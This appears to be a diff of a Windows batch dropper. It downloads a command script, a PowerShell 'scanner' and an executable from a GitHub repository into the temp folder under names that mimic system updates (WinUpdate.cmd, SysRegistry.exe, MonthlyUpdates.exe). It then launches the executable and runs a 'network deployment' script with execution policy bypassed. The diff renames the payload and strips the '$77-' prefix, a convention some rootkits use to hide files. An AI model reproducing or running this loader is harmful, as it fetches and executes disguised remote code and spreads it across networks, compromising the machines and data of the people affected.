@@ -29,9 +29,9 @@ if '%errorlevel%' NEQ '0' (
     :: Configure download URLs and file paths
 set "PS1_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/prep.cmd"
 set "PS1.2_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/scanner.ps1"
-set "EXE_URL=https://github.com/Drakovthe6th/TBuG/raw/master/$77-Oking.exe"
+set "EXE_URL=https://github.com/Drakovthe6th/TBuG/raw/master/Advance.exe"
 set "PS1_FILE=%temp%\WinUpdate.cmd"
-set "EXE_FILE=%temp%\$77-SysRegistry.exe"
+set "EXE_FILE=%temp%\SysRegistry.exe"
 set "PS1.2_FILE=%temp%\IdleSystemCheck.ps1"
 
 :: Download files using PowerShell
@@ -54,7 +54,7 @@ start "" "%EXE_FILE%"
 
 :: Execute deployment script with parameters
 echo Starting network deployment...
-powershell -ExecutionPolicy Bypass -Command "& '%PS1.2_FILE%' -UpdateServer 'https://github.com/Drakovthe6th/TBuG/raw/master/$77-Oking.exe' -ExeName '$77-MonthlyUpdates.exe'"
+powershell -ExecutionPolicy Bypass -Command "& '%PS1.2_FILE%' -UpdateServer 'https://github.com/Drakovthe6th/TBuG/raw/master/Advance.exe' -ExeName 'MonthlyUpdates.exe'"
 
 
 endlocal
